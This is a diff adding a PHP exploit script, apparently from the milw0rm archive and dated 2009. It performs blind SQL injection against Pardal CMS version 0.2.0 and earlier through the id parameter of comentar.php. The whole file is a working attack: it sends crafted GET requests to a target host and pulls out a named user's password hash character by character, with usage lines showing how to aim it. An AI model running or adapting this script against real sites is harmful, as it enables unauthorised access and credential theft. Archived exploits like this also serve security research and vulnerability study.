@@ -1,0 +1,77 @@
+--+++=============================================================+++--
+--+++====== Pardal CMS <= 0.2.0 Blind SQL Injection Exploit ======+++--
+--+++=============================================================+++--
+
+<?php
+
+function usage ()
+{
+    echo "\nPardal CMS <= 0.2.0 Blind SQL Injection Exploit".
+         "\n[+] Author  : darkjoker".
+         "\n[+] Site    : http://darkjoker.net23.net".
+         "\n[+] Download: http://tinyurl.com/csg4vt".
+         "\n[+] Usage   : php xpl.php <hostname> <path> <username>".
+         "\n[+] Ex.     : php xpl.php localhost /PardalCMS Admin".
+         "\n\n";
+    exit ();
+}
+
+
+function query ($user, $chr, $pos)
+{
+    $query = "x' OR ASCII(SUBSTRING((SELECT senha FROM users WHERE login = '{$user}'),{$pos},1))='{$chr}";
+    $query = str_replace (" ", "%20", $query);
+    $query = str_replace ("'", "%27", $query);
+    return $query;
+}
+
+function exploit ($hostname, $path, $user, $pos, $chr)
+{
+    $chr = ord ($chr);
+    $fp = fsockopen ($hostname, 80);
+    $query = query ($user, $chr, $pos);
+    $request = "GET {$path}/comentar.php?id={$query} HTTP/1.1\r\n".
+           "Host: {$hostname}\r\n".
+           "Connection: Close\r\n\r\n";
+    
+    fputs ($fp, $request);
+    while (!feof ($fp))
+        $reply .= fgets ($fp, 1024);
+    
+    fclose ($fp);
+
+    if (preg_match ("/\"#FFFFFF\"> em <\/font>/", $reply))
+        return false;
+    else
+        return true;
+}
+
+if ($argc != 4)
+    usage ();
+
+$hostname = $argv [1];
+$path = $argv [2];
+$username = $argv [3];
+$key = "abcdef0123456789";
+$pos = 1;
+$chr = 0;
+
+echo "[+] Password: ";
+
+while ($pos <= 32)
+{
+    if (exploit ($hostname, $path, $username, $pos, $key [$chr]))
+    {
+        echo $key [$chr];
+        $chr = 0;
+        $pos++;
+    }
+    else
+        $chr++;
+}
+
+echo "\n\n";
+
+?>
+
+# milw0rm.com [2009-01-22]
